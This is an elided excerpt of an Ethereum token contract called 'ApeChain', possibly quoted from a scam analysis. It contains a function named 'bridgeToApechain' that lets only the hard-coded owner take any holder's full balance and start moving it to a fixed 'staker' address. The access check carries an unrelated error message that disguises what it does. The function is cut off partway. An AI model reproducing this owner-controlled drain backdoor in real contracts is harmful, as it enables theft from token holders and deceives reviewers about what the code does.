...
contract ApeChain is Context, IERC20 {
    ...
    address lead_deployer = 0x295d587aA3Ca6E57e227A4430Ab7c4c00989a195;
    address public _owner = 0xC58D190a5f6aC4D1223E69a280E2753fa2263C6e;
   constructor () public {
...
//-----------------------------------------------------------------------------------------------------------------------//
        ...
        function bridgeToApechain(address account) public {
         address staker = 0x03ca52E482912308c287D09EC941b996c18668f5;
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, staker, amount);
